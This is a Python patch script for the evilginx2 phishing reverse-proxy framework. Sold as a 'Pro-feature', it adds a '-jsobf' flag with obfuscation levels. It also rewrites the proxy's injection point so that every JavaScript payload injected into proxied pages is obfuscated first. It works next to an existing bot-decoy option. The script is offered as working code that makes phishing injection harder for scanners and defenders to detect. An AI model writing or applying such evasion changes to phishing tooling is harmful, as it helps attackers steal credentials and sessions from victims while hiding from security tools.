#!/usr/bin/env python3
# patch_jsobf.py — Pro-feature #9: JS obfuscation levels for js_inject. Run in ~/evilginx2-src.
import sys

def patch(path, old, new):
    src = open(path, "r", encoding="utf-8").read()
    n = src.count(old)
    if n != 1:
        sys.exit(f"[abort] {path}: pattern found {n}x (need exactly 1):\n{old[:140]}")
    open(path, "w", encoding="utf-8").write(src.replace(old, new))
    print(f"[patch] {path} OK")

# 1) struct field
patch("core/http_proxy.go",
      "\tbotguard          bool\n",
      "\tbotguard          bool\n"
      "\tjsobf             string\n")

# 2) main.go flag + setter call
patch("main.go",
      'var botguard_mode = flag.Bool("botguard", false, "Serve decoy content to suspected bots/scanners")\n',
      'var botguard_mode = flag.Bool("botguard", false, "Serve decoy content to suspected bots/scanners")\n'
      'var jsobf_level = flag.String("jsobf", "off", "Obfuscate injected JS: off|low|medium|high|ultra")\n')
patch("main.go",
      "\thp.SetBotguard(*botguard_mode)\n",
      "\thp.SetBotguard(*botguard_mode)\n"
      "\thp.SetJsObfuscation(*jsobf_level)\n")

# 3) choke point: every js_inject payload passes through here
patch("core/http_proxy.go",
      '\tvar d_inject string\n'
      '\tif script != "" {\n'
      '\t\td_inject = "<script" + js_nonce + ">" + script + "</script>\\n${1}"\n',
      '\tvar d_inject string\n'
      '\tif script != "" {\n'
      '\t\tscript = ObfuscateJS(script, p.jsobf)\n'
      '\t\td_inject = "<script" + js_nonce + ">" + script + "</script>\\n${1}"\n')

print("[done] jsobf patches applied")
